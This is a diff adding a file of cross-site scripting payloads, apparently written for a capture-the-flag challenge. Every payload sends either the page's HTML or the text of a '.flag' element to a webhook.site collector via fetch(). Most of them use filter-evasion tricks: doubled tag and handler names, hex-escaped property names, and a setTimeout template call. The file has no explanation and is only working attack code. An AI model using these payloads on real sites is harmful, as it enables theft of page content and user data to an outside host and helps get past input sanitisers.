@@ -1,0 +1,22 @@
+<script>
+ fetch('https://webhook.site/e7abaf6f-b844-49f9-8419-1c0531457027?q='+encodeURIComponent(document.body.innerHTML))
+</script>
+
+<img src=/f onerror=fetch('https://webhook.site/e7abaf6f-b844-49f9-8419-1c0531457027?q='+encodeURIComponent(document.body.innerHTML))>
+
+<SCRIPT>
+ fetch('https://webhook.site/e7abaf6f-b844-49f9-8419-1c0531457027?q='+encodeURI(document.body.innerHTML))
+</SCRIPT>
+
+<scriscriptpt>
+  fetch(
+ 		'https://webhook.site/e7abaf6f-b844-49f9-8419-1c0531457027?q=' +
+		document['query\x53elector']('.flag')['text\x43\x6fntent']
+  )
+</scriscriptpt>
+
+<img src=/foo oonnerror="fetch('https://webhook.site/e7abaf6f-b844-49f9-8419-1c0531457027?q=' + document['query\x53elector']('.flag')['text\x43\x6fntent'])"//
+
+<img/src="/foo"/oonnerror="fetch('https://webhook.site/e7abaf6f-b844-49f9-8419-1c0531457027?q=' + document['query\x53elector']('.flag')['text\x43\x6fntent'])"//
+
+<img/src="/foo"/oonnerror="window['set\x54imeout']`fetch\x28'https://webhook.site/e7abaf6f-b844-49f9-8419-1c0531457027?q=' + document['query\x53elector']\x28'.flag'\x29['text\x43\x6fntent']\x29`"//
